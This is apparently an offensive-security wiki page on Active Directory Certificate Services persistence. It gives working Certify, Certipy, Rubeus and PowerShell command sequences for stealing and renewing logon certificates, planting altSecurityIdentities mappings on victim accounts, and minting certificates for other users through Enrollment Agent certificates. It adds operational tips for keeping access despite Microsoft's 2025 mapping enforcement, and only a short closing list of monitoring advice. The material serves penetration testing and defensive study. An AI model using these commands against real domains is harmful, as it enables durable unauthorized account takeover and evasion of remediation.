# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**This is a small summary of the account persistence chapters of the awesome research from [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Understanding Active User Credential Theft with Certificates – PERSIST1

In a scenario where a certificate that allows domain authentication can be requested by a user, an attacker has the opportunity to request and steal this certificate to maintain persistence on a network. By default, the `User` template in Active Directory allows such requests, though it may sometimes be disabled.

Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:

```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```

A certificate’s power lies in its ability to authenticate as the user it belongs to, regardless of password changes, as long as the certificate remains valid.

You can convert PEM to PFX and use it to obtain a TGT:

```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```

> Note: Combined with other techniques (see THEFT sections), certificate-based auth allows persistent access without touching LSASS and even from non-elevated contexts.

## Gaining Machine Persistence with Certificates - PERSIST2

If an attacker has elevated privileges on a host, they can enroll the compromised system’s machine account for a certificate using the default `Machine` template. Authenticating as the machine enables S4U2Self for local services and can provide durable host persistence:

```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```

## Extending Persistence Through Certificate Renewal - PERSIST3

Abusing the validity and renewal periods of certificate templates lets an attacker maintain long-term access. If you possess a previously issued certificate and its private key, you can renew it before expiration to obtain a fresh, long-lived credential without leaving additional request artifacts tied to the original principal.

```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
            -template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```

> Operational tip: Track lifetimes on attacker-held PFX files and renew early. Renewal can also cause updated certificates to include the modern SID mapping extension, keeping them usable under stricter DC mapping rules (see next section).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

If you can write to a target account’s `altSecurityIdentities` attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and, when using strong mapping formats, remains functional under modern DC enforcement.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:

```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Then authenticate with your PFX. Certipy will obtain a TGT directly:

```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```

### Building Strong `altSecurityIdentities` Mappings

In practice, **Issuer+Serial** and **SKI** mappings are the easiest strong formats to build from an attacker-held certificate. This matters after **February 11, 2025**, when DCs default to **Full Enforcement** and weak mappings stop being reliable.

```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```

Notes
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

On **Windows Server 2022+** domain controllers patched with the **September 9, 2025** security update, Microsoft added another strong explicit mapping format that is attractive for persistence because it survives certificate reissuance from the same CA:

```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Operationally this differs from the older strong formats:
- `Issuer+Serial` pins **one exact certificate**.
- `SKI` / `SHA1-PUKEY` pin **one keypair**.
- `Issuer/SID` pins the **issuing CA + target SID**, so renewed or reissued certificates from the same CA keep working without rewriting `altSecurityIdentities`.

Requirements and caveats
- The certificate presented for logon must actually contain the target account SID in the SID security extension.
- This format is not helpful for `ESC9` / `ESC16` style certificates that omit the SID extension; in those cases fall back to `Issuer+Serial`, `SKI`, or `SHA1-PUKEY`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:

```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
                   /onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
           -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```

Revocation of the agent certificate or template permissions is required to evict this persistence.

Operational notes
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

If the DC does not have a Smart Card Logon-capable certificate, certificate logon via PKINIT can fail with `KDC_ERR_PADATA_TYPE_NOSUPP`. That does **not** kill the persistence primitive: the same PFX is often still usable for Schannel-authenticated LDAP access.

```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```

This is especially useful after PERSIST4/PERSIST5 because you can keep operating from Linux/macOS and chain other directory persistence actions such as dropping [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) or editing writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since **February 11, 2025**, DCs default to **Full Enforcement** for weak/ambiguous mappings, and as of the **September 9, 2025** security update patched DCs no longer support the old Compatibility-mode fallback. Practical implications:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, and on modern DCs `Issuer/SID`) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.
- If weak mappings still appear to work, assume you hit an unpatched or differently configured DC rather than a reliable long-term persistence path.
- `ESC9` / `ESC16` style issuance paths that suppress the SID extension make `Issuer/SID` unusable, so fallback strong mappings or renewal via a normal template become the practical persistence option.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
